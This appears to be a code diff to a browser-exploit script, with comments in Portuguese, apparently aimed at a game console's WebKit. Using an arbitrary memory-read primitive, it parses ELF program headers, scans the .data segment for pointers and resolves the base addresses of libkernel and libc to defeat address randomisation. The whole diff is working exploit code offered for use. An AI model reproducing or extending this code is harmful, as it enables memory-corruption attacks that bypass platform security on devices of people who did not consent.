@@ -102,30 +102,51 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
 // ═════════════════════════════════════════════════════════════════════════════
-// VARREDURA SEGURA EM CHUNKS ASSÍNCRONOS
+// PASSO 0: ACHAR O RANGE EXATO DA .data VIA ELF PROGRAM HEADERS
+// Isso evita varredura cega — vamos direto para a seção certa!
 // ═════════════════════════════════════════════════════════════════════════════
 
-const SCAN_START   = 0x010000;   // 2MB offset
-const SCAN_END     = 0x050000;   // 6MB offset (total 4MB)
-const STEP         = 0x100;      // 256 bytes — mais rápido, menos preciso
-const CHUNK_SIZE   = 0x8000;     // 32KB por chunk (evita bloqueio)
-const MAX_CANDS    = 10;
-const MAX_SCAN_BACK = 0x400000;
+function getDataSectionRange(p, webkitBase) {
+  try {
+    let phoff = p.read64(webkitBase.add32(0x20)).low;
+    let phnum = p.read16(webkitBase.add32(0x38));
 
-function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
+    for (let i = 0; i < phnum; i++) {
+      let phAddr = webkitBase.add32(phoff + i * 0x38);
+      let p_type = p.read32(phAddr);
+      if (p_type === 1) { // PT_LOAD
+        let p_flags = p.read32(phAddr.add32(4));
+        let p_vaddr = p.read64(phAddr.add32(0x10)).low;
+        let p_memsz = p.read64(phAddr.add32(0x28)).low;
+        // .data = PT_LOAD com flags RW (PF_R | PF_W = 0x6)
+        if ((p_flags & 0x6) === 0x6 && p_vaddr > 0x100000) {
+          log('[+] PT_LOAD RW: vaddr=0x' + p_vaddr.toString(16) + ' size=0x' + p_memsz.toString(16), 'd');
+          return { start: p_vaddr, end: p_vaddr + p_memsz };
+        }
+      }
+    }
+  } catch(e) {}
+  return null;
 }
 
-async function scanChunk(p, webkitBase, startOff, endOff, lkCands, lcCands) {
-  for (let off = startOff; off < endOff; off += STEP) {
-    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) return;
+// ═════════════════════════════════════════════════════════════════════════════
+// PASSO 1: VARREDURA PROGRESSIVA (começa com 32KB, aumenta se precisar)
+// ═════════════════════════════════════════════════════════════════════════════
 
+const STEP       = 0x100;      // 256 bytes
+const CHUNK_SIZE = 0x2000;     // 8KB por chunk
+const MAX_CANDS  = 5;
+const SLEEP_MS   = 25;         // 25ms entre chunks
+
+async function scanRange(p, webkitBase, startOff, endOff, lkCands, lcCands) {
+  for (let off = startOff; off < endOff; off += STEP) {
+    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) return true;
     try {
       let ptr = p.read8(webkitBase.add32(off));
-      let hi = ptr.hi;
-      let lo = ptr.low;
-
+      let hi = ptr.hi, lo = ptr.low;
       if (lo === 0 && hi === 0) continue;
       if ((lo & 0x7) !== 0) continue;
 
@@ -137,39 +158,58 @@ async function scanChunk(p, webkitBase, startOff, endOff, lkCands, lcCands) {
       }
     } catch(e) {}
   }
+  return false;
 }
 
-async function scanForBases(p, webkitBase) {
-  logH('VARREDURA SEGURA DE PONTEIROS');
-  log('[+] Range: 0x' + SCAN_START.toString(16) + ' - 0x' + SCAN_END.toString(16));
-  log('[+] Step: 0x' + STEP.toString(16) + ' | Chunk: 0x' + CHUNK_SIZE.toString(16));
+async function progressiveScan(p, webkitBase) {
+  logH('VARREDURA PROGRESSIVA');
+
+  // Tentar achar range da .data via ELF primeiro
+  let dataRange = getDataSectionRange(p, webkitBase);
+  let ranges = [];
+
+  if (dataRange) {
+    log('[+] Range .data identificado via ELF: 0x' + dataRange.start.toString(16) + ' - 0x' + dataRange.end.toString(16));
+    // Começar no meio da .data (onde variáveis globais ficam)
+    let mid = dataRange.start + Math.floor((dataRange.end - dataRange.start) / 2);
+    ranges.push({ start: mid, size: 0x8000 });      // 32KB no meio
+    ranges.push({ start: mid - 0x4000, size: 0x10000 }); // 64KB centrado
+    ranges.push({ start: dataRange.start, size: 0x20000 }); // 128KB do início
+  } else {
+    log('[!] .data não identificado, usando ranges padrão');
+    ranges.push({ start: 0x300000, size: 0x8000 });   // 32KB
+    ranges.push({ start: 0x2F0000, size: 0x10000 });  // 64KB
+    ranges.push({ start: 0x2C0000, size: 0x20000 });  // 128KB
+    ranges.push({ start: 0x280000, size: 0x40000 });  // 256KB
+  }
 
   let lkCands = [];
   let lcCands = [];
-  let totalChunks = Math.ceil((SCAN_END - SCAN_START) / CHUNK_SIZE);
 
-  for (let i = 0; i < totalChunks; i++) {
-    let chunkStart = SCAN_START + i * CHUNK_SIZE;
-    let chunkEnd = Math.min(chunkStart + CHUNK_SIZE, SCAN_END);
+  for (let i = 0; i < ranges.length; i++) {
+    let r = ranges[i];
+    let start = r.start;
+    let end = r.start + r.size;
+    log('[+] Scan #' + (i+1) + ': 0x' + start.toString(16) + ' - 0x' + end.toString(16) + ' (' + (r.size/1024) + 'KB)');
 
-    await scanChunk(p, webkitBase, chunkStart, chunkEnd, lkCands, lcCands);
+    let chunks = Math.ceil((end - start) / CHUNK_SIZE);
+    for (let c = 0; c < chunks; c++) {
+      let cStart = start + c * CHUNK_SIZE;
+      let cEnd = Math.min(cStart + CHUNK_SIZE, end);
+      await scanRange(p, webkitBase, cStart, cEnd, lkCands, lcCands);
+      setStatus('Scan #' + (i+1) + ' chunk ' + (c+1) + '/' + chunks);
+      await sleep(SLEEP_MS);
+      if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) break;
+    }
 
-    // Progresso
-    let pct = Math.floor((i + 1) * 100 / totalChunks);
-    setStatus('Varrendo... ' + pct + '%');
-
-    // Respirar a cada chunk para não travar o navegador
-    await sleep(10);
-
-    // Early exit
-    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) {
-      log('[+] Early exit: candidatos suficientes');
+    log('  -> lk=' + lkCands.length + ' lc=' + lcCands.length);
+    if (lkCands.length > 0 && lcCands.length > 0) {
+      log('[+] Candidatos suficientes encontrados', 'ok');
       break;
     }
   }
 
-  log('[+] lk-cands: ' + lkCands.length + ' | lc-cands: ' + lcCands.length);
-
+  // Logar candidatos
   for (let i = 0; i < Math.min(3, lkCands.length); i++) {
     log('  lk[' + i + '] off=0x' + lkCands[i].off.toString(16) + ' ptr=0x' + lkCands[i].ptr.toString(16), 'd');
   }
@@ -177,12 +217,12 @@ async function scanForBases(p, webkitBase) {
     log('  lc[' + i + '] off=0x' + lcCands[i].off.toString(16) + ' ptr=0x' + lcCands[i].ptr.toString(16), 'd');
   }
 
+  // Resolver bases
   let libkernelBase = null;
   for (let c of lkCands) {
     let base = findElfBase(p, c.ptr);
     if (base) { libkernelBase = base; log('[+] libkernel: 0x' + base.toString(16), 'ok'); break; }
   }
-
   let libcBase = null;
   for (let c of lcCands) {
     let base = findElfBase(p, c.ptr);
@@ -193,7 +233,7 @@ async function scanForBases(p, webkitBase) {
 }
 
 function findElfBase(p, startPtr) {
-  for (let back = 0; back < MAX_SCAN_BACK; back += 0x1000) {
+  for (let back = 0; back < 0x400000; back += 0x1000) {
     try {
       let test = startPtr.sub32(back);
       if (p.read32(test) === 0x464C457F) {
@@ -227,7 +267,7 @@ async function validateBases(p, libkernelBase, libcBase) {
     if (!ok) log('[✗] libkernel: ELF inválido', 'e');
 
     let aligned = (libkernelBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libkernel: page-aligned' : '[✗] libkernel: misaligned', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libkernel: page-aligned' : '[✗] misaligned', aligned ? 'ok' : 'w');
     if (!aligned) valid.libkernel = false;
 
     let stubs = 0;
@@ -260,7 +300,7 @@ async function validateBases(p, libkernelBase, libcBase) {
     if (!ok) log('[✗] libc: ELF inválido', 'e');
 
     let aligned = (libcBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libc: page-aligned' : '[✗] libc: misaligned', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libc: page-aligned' : '[✗] misaligned', aligned ? 'ok' : 'w');
     if (!aligned) valid.libc = false;
   }
 
@@ -340,9 +380,8 @@ async function main() {
   log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
   setCard('c-wk', '0x' + webkitBase.toString(16));
 
-  // ─── Varredura segura ───
   setTimeout(async () => {
-    const result = await scanForBases(p, webkitBase);
+    const result = await progressiveScan(p, webkitBase);
     const libKernelBase = result.libkernelBase;
     const libcBase = result.libcBase;
 
